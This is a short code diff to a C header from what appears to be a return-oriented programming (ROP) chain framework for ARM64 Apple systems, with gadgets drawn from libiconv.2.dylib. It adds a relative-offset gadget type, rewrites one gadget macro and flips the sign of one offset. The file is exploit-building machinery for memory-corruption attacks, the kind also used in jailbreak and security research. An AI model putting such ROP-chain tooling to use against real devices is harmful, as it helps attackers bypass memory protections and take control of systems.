@@ -9,6 +9,7 @@ enum ropgadget_types {
 	STATIC,
 	CODEADDR,
 	OFFSET,
+	REL_OFFSET,
 	NONE,
 	BUF,
 	BARRIER,
@@ -122,7 +123,9 @@ typedef struct rop_var rop_var_t;
 #define ADD_ROP_VAR_GADGET(name) ADD_ROP_VAR_GADGET_W_OFFSET(name,0)
 
 #define ADD_REL_OFFSET_GADGET(val) \
-	ADD_OFFSET_GADGET((ropchain_len * 8 - 16 + val));
+	ADD_GADGET(); \
+	curr_gadget->value = (uint64_t)val; \
+	curr_gadget->type = REL_OFFSET; 
 
 /****** FRAMEWORK ****/
 
@@ -370,7 +373,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x22 */ \
 	ADD_GADGET(); /* x21 */ \
 	ADD_GADGET(); /* x20 */ \
-	ADD_ROP_VAR_GADGET_W_OFFSET(name, ((offsets)->str_x0_gadget_offset)); /* x19 */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(name, (-(offsets)->str_x0_gadget_offset)); /* x19 */ \
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->str_x0_gadget); /* x30 */  \
 	ADD_GADGET(); /* x20 */ \
